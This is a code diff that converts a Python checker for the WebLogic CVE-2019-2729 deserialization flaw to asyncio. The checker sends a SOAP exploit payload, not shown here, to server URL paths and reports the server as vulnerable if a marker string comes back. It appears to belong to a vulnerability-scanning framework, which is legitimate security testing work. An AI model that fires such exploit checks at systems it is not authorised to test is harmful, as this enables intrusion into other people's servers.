@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.common import get_capta
-from app.lib.utils.request import request
+import asyncio
+from app.lib.request import request
+from app.lib.common import get_capta
 
 class CVE_2019_2729_BaseVerify:
     def __init__(self, url):
@@ -9759,8 +9760,28 @@ class CVE_2019_2729_BaseVerify:
             <soapenv:Body/>
             </soapenv:Envelope>
         '''
+    
+    async def handle(self, url, data):
 
-    def check(self):
+        """
+        发送请求,判断内容
+
+        :param str url: 请求url
+        :param str data: 请求的数据
+
+        :return bool True or False: 是否存在漏洞
+        """
+
+        try:
+            
+            check_req = await request.post(url, headers = self.check_headers, data = data)
+            if self.capta in await check_req.text():
+                return True
+        except Exception as e:
+            # print(e)
+            pass
+
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -9769,20 +9790,21 @@ class CVE_2019_2729_BaseVerify:
 
         :return bool True or False: 是否存在漏洞
         """
-        
-        flag = 0
+
+        tasks = []
         for url_suffix in self.url_suffix:
             url = self.url + url_suffix
-            try:
-                check_req = request.post(url, headers = self.check_headers, data = self.payload)
-                if self.capta in check_req.text:
-                    return True
-            except Exception as e:
-                print(e)
-                pass
-            
-        return False
+            task = asyncio.create_task(self.handle(url, self.payload))
+            tasks.append(task)
+            break
+
+        results = await asyncio.gather(*tasks)
+        for result in results:
+            if result:
+                return True
 
 if __name__ == '__main__':
-    CVE_2019_2729 = CVE_2019_2729_BaseVerify('http://10.3.15.56:9000')
-    CVE_2019_2729.check()
+    CVE_2019_2729 = CVE_2019_2729_BaseVerify('http://127.0.0.1:7001')
+    import asyncio
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    print(asyncio.run(CVE_2019_2729.check()))
